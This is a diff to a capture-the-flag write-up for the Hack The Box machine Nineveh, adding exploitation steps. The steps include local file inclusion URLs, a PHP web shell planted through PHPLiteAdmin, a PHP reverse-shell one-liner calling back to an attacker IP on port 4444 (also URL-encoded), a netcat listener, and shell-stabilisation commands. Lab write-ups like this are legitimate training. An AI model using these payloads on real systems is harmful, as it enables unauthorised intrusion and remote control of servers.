@@ -89,7 +89,7 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-m
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/55fafbd0-eb21-431a-be79-3db22feed399)
 
-+ `admin`:`password123` username and password discovered on **https://nineveh.htb/db/**
++ `admin` username and `password123` password discovered on **https://nineveh.htb/db/**
 
 ## Exploitation
 + Navigate to `http://nineveh.htb/department/login.php`
@@ -97,14 +97,83 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-m
 + Navigate to `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`
 + Check the path whether is vulnerable to LFI.
 + Use the LFI payload: `../../../../../../../etc/passwd`
+```
+http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
+
+http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd
+```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d6c83b59-310c-4bf9-8d2f-94b4d6771a15)
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4a8c5328-264a-4fa1-8c3a-bab57c4e932b)
+
 + Keep going on chain.
 
-+ Okay go back to [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection requires authentication](https://www.exploit-db.com/exploits/24044) again.
-+ 
++ Okay go back to [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection requires authentication](https://www.exploit-db.com/exploits/24044) on **https://nineveh.htb/db/** again.
++ Login with `password123`
++ Create new database.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a511a89f-9e10-49dd-b1fa-134d3c64f2e9)
+
++ Create new table and go.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3bef59a1-f7cd-4e47-91d6-40712f3933b8)
+
++ Fill out field and default value, then create.
++ `<?php echo system($_REQUEST["cmd"]); ?>` payload for create.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/88cb1f74-3847-45f5-a6e5-e68caaa0a9d0)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e727b1cf-9c79-4476-95a5-44f07e721400)
+
++ Navigate to `http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt../../../../../../../etc/passwd` for /var/tmp/try.php`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/840b2abb-ea07-404a-8182-00ed1357adf5)
+
++ Change the file and payload:
+```
+http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=id;ls;pwd
+```
+
++ The code executed.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/52b322d4-6962-4189-93e7-e4097102cfb9)
+
++ Reverse shell payload `php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
++ [url encoding](https://www.url-encode-decode.com/) the payload:
+```
+php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
+```
+
++ Start listener: ``nc -lnvp 4444` on yoru attack machine.
++ Execute command:
+```
+http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
+```
+
++ Get shell.
++ Stable shell:
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+script /dev/null -c bash
+CTRL^Z
+stty raw -echo; fg
+reset
+terminal type? xterm
+export TERM=xterm  
+export SHELL=bash
+
+```
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bffc80ba-8ed6-4c9a-99d4-8ca0c6533fd1)
+
++ **www-data** doesn't have read permission: `ls -l /home/amrois/`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ca14a5be-2b4c-4845-a4bf-df1920bf9209)
+
+
++ Donwload [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and transfer it to the target.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd7bf5da-cae9-49fe-bf09-f0a1be5f1cb7)
 
 
 
